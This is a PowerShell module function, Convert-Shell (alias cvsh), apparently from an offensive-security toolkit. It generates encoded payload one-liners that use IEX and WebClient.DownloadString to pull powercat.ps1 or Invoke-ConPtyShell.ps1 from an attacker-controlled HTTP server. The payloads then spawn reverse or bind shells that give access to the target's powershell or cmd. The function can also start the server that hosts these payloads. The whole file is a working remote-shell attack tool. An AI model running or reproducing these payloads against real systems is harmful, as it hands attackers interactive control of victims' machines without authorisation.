function Convert-Shell
{
<#
.SYNOPSIS
    Returns a base64-encoded payload for retrieving powershell payloads
    from the attack host to the target system, and executes a shell
    via using PowerCat or ConPtyShell

.DESCRIPTION
    Convert-Shell is a function that encodes and serves powershell payloads
    from the attack host and instructs the target system to download
    it, followed by executing a shell

.PARAMETER Type
    Shell type (powercat|conpty)
    Alias: t

.PARAMETER Interface
    Interface name
    Alias: i

.PARAMETER Reverse
    Executes a reverse shell
    Alias: r
    This is the default choice

.PARAMETER Bind
    Executes a powercat bind shell
    Alias: b

.PARAMETER LHOST
    Listen addr|interface for powercat reverse shell
    Can be omitted since -i will pre-populate
    both -LHOST and -Srvhost
    Alias: lh
    Defaults to tun0

.PARAMETER LPORT
    Listening port (bind|reverse)
    Alias: lp

.PARAMETER Serve
    Starts a Python HTTP server
    Alias: s
    Ctrl+C stops the running server

.PARAMETER Srvhost
    Address for serving powercat.ps1
    Alias: sh
    Defaults to designated interface

.PARAMETER Srvport
    Listening port for serving powercat.ps1
    Alias: sp

.PARAMETER Exec
    Command to execute
    Alias: e

.PARAMETER Rows
    Terminal height
    Default: current terminal window's height

.PARAMETER Cols
    Terminal width
    Default: current terminal window's width

.EXAMPLE
    Convert-Shell -t powercat -i tun0 -LPORT 443 -Serve

.EXAMPLE
    Convert-Shell -t powercat -i tun0 -lp 443 -s -sp 8080 -e cmd

.EXAMPLE
    cvsh -t conpty -i tun0 -lp 443 -s

.EXAMPLE
    cvsh -t conpty -i tun0 -lp 443 -s -Rows 51 -Cols 191 -sh tun0 -sp 8000

.EXAMPLE
    cvsh -t conpty -i tun0 -lp 443 -s -Rows 51 -Cols 191 -sh 192.168.45.120 -sp 3000

.INPUTS
    String

.OUTPUTS
    Base64-Encoded payload
#>
	param (
		
    [Parameter(Mandatory = $true)]
    [ValidateSet("conpty", "powercat")]
    [Alias("t")]
    [String]$Type = "conpty",

    [Parameter(Mandatory = $false)]
    [ArgumentCompletions("tun0", "eth0", "wlan0", "lo")]
    [Alias("i")]
    [String]$Interface = "tun0",

    [Parameter(Mandatory = $false)]
    [Alias("lh")]
    [String]$LHOST = "",

		[Parameter(Mandatory = $true)]
    [Alias("lp")]
    [String]$LPORT = "443",

		[Parameter(Mandatory = $false)]
    [Alias("r")]
    [Switch]$Reverse = $true,

		[Parameter(Mandatory = $false)]
    [Alias("b")]
    [Switch]$Bind = $false,

		[Parameter(Mandatory = $false)]
    [Alias("s")]
    [Switch]$Serve,

    [Parameter(Mandatory = $false)]
    [Alias("sh")]
    [String]$Srvhost = "0.0.0.0",

		[Parameter(Mandatory = $false)]
    [Alias("sp")]
    [String]$Srvport = "80",
    
		[Parameter(Mandatory = $false)]
    [ArgumentCompletions("powershell", "cmd")]
    [Alias("e")]
    [String]$Exec = "powershell",

		[Parameter(Mandatory = $false)]
    [String]$Rows = $host.UI.RawUI.WindowSize.Height,

		[Parameter(Mandatory = $false)]
    [String]$Cols = $host.UI.RawUI.WindowSize.Width

    )

  $rootWarn=@"

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@           HERE COMES THE BIG BRIGHT RED WARNING           @
@           -------------------------------------           @
@                                                           @
@ [!] WARNING: ROOT SHELL DETECTED!                         @
@ --------------------------------------------------------- @
@ [!] ENFORCED ACTION: FAILURE; EXIT(1)                     @
@ --------------------------------------------------------- @
@ [!] RECOMMENDED ACTION: DROP TO A STANDARD USER SHELL     @
@ --------------------------------------------------------- @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

"@

  # Seriously. Stop.
  if ( $env:USER -eq "root" ) {
    Write-Host $rootWarn -ForegroundColor Red
    exit(1)
  }

  # Grab interface IPv4 addr
  $ip = Get-InterfaceAddress -i $Interface

  switch -Regex ( $Srvhost ) {
    
    "^0.0.0.0$" {
        $Srvhost = $ip
    }

    { $_ -as [ipaddress] } {
        $Srvhost = $Srvhost
    }

    "^([a-z]+[0-9]|lo)$" {
        Write-Output ""
        $Srvhost = Get-InterfaceAddress -i $Srvhost
        if ( !$Srvhost ) {
            $Srvhost = $ip
        }
    }

    default {
        Write-Output ""
        Write-Host "[-] Invalid interface name or IPv4 address: $Srvhost" -ForegroundColor Red
        Write-Host "[!] Falling back to selected interface: $Interface ($ip)" -ForegroundColor Magenta
        $Srvhost = $ip
    }

  }

  switch -Regex ( $LHOST ) {
    
    "^0.0.0.0$" {
        $LHOST = $ip
    }

    "^$" {
        $LHOST = $ip
    }

    { $_ -as [ipaddress] } {
        $LHOST = $LHOST
    }

    "^([a-z]+[0-9])|lo$" {
        Write-Output ""
        $nullHost = $LHOST
        $LHOST = Get-InterfaceAddress -i $LHOST
        if ( !$lhost ) {
            Write-Output ""
            Write-Host "[-] Invalid interface name or IPv4 address: ($nullHost)" -ForegroundColor Red
            Write-Host "[!] Falling back to selected interface: $interface ($ip)" -ForegroundColor Magenta
            $LHOST = $ip
        }
    }

    "^$" {
        $LHOST = $ip
    }

    default {
        Write-Output ""
        Write-Host "[-] Invalid interface name or IPv4 address: $LHOST" -ForegroundColor Red
        Write-Host "[!] Falling back to selected interface: $Interface ($ip)" -ForegroundColor Magenta
        $LHOST = $ip
    }

  }

  if ( !$ip ) {
    Write-Prompts -m "[-] Invalid interface" -t e
  }
  else {
    switch ( $Type ) {

        "conpty" {
          # Check whether extensions subdirectory exists
          # Initialize if not and download Invoke-ConPtyShell.ps1
          $extDir = "$env:HOME/.local/share/powershell/Modules/PSX/extensions"
          if ( ![System.IO.Directory]::Exists($extDir) ) {
            Write-Output ""
            Write-Host "[!] Initializing extensions directory (this is a one-time action)"
            $extCreate = New-Item -Path $extDir -Type Directory -Confirm
            if ( $extCreate ) {
              Write-Prompts -m "[+] $extDir created successfully" -t s
              Write-Host "[!] Downloading https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.ps1"
              Write-Output ""
              Write-Host "Confirm" -ForegroundColor White
              Write-Host @"
Are you sure you want to perform this action?
Performing the operation "Download File" on target "Destination: $extDir/Invoke-ConPtyShell.ps1".
"@
              Write-Host "[Y] Yes  " -ForegroundColor Yellow -NoNewline
              Write-Host "[N] No  " -ForegroundColor White -NoNewline
              $confirmDownload = Read-Host -Prompt "(default is `"Y`")"
              if ( (!$confirmDownload) -Or ($confirmDownload.ToLower() -eq "y") ) {
                $ProgressPreference = "SilentlyContinue"
                Invoke-WebRequest -Uri "https://github.com/antonioCoco/ConPtyShell/raw/master/Invoke-ConPtyShell.ps1" -Outfile "$extDir/Invoke-ConPtyShell.ps1"
                Write-Prompts -m "[+] Invoke-ConPtyShell.ps1 downloaded successfully" -t s
                $conf.Dependencies.Extensions | Where-Object Module -eq "Invoke-ConPtyShell" | ? { $_.Status = "OK" }
                $conf | ConvertTo-JSON -Depth 4 | Out-File $env:HOME/.local/share/powershell/Modules/PSX/.config/config.json

                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $LHOST $LPORT -Rows $Rows -Cols $Cols"
                Write-Prompts -s $string -t po

                # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
                # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
                if ( $Serve ) {
                    Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty -Internal
                }
              }
              else {
                Write-Prompts -m "[-] Download canceled" -t e
              }
            }
          }
          else {
            $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell $LHOST $LPORT -Rows $Rows -Cols $Cols"
            Write-Prompts -s $string -t po

            # Spin up a Python HTTP server, hosting Invoke-ConPtyShell.ps1
            # from $env:HOME/.local/share/powershell/Modules/PSX/extensions
            if ( $Serve ) {
                Invoke-Server -b $Srvhost -d $env:HOME/.local/share/powershell/Modules/PSX/extensions -p $Srvport -Shell conpty -Internal
            }
          }
        }

        "powercat" {
          if ( $Bind ) {
                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/powercat.ps1');powercat -l -p $LPORT -e $Exec"
            }
          else {
                $string = "IEX(New-Object System.Net.WebClient).DownloadString('http://$Srvhost`:$Srvport/powercat.ps1');powercat -c $LHOST -p $LPORT -e $Exec"
            }

          Write-Prompts -s $string -t po

          # Spin up a Python HTTP server, hosting powercat.ps1 from its original location
          if ( $Serve ) {
              if ( !$Bind ) {
                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -Shell powercat -Internal
              }
              else {
                  Invoke-Server -b $Srvhost -d /usr/share/powershell-empire/empire/server/data/module_source/management -p $Srvport -PCB -Internal
              }
          }
        }

        default {
          Write-Prompts -m "[-] Invalid type selected. Available types: powercat|conpty" -t e
        }
      }
  }
}

Set-Alias -Name cvsh -Value Convert-Shell
Export-ModuleMember -Function * -Alias *

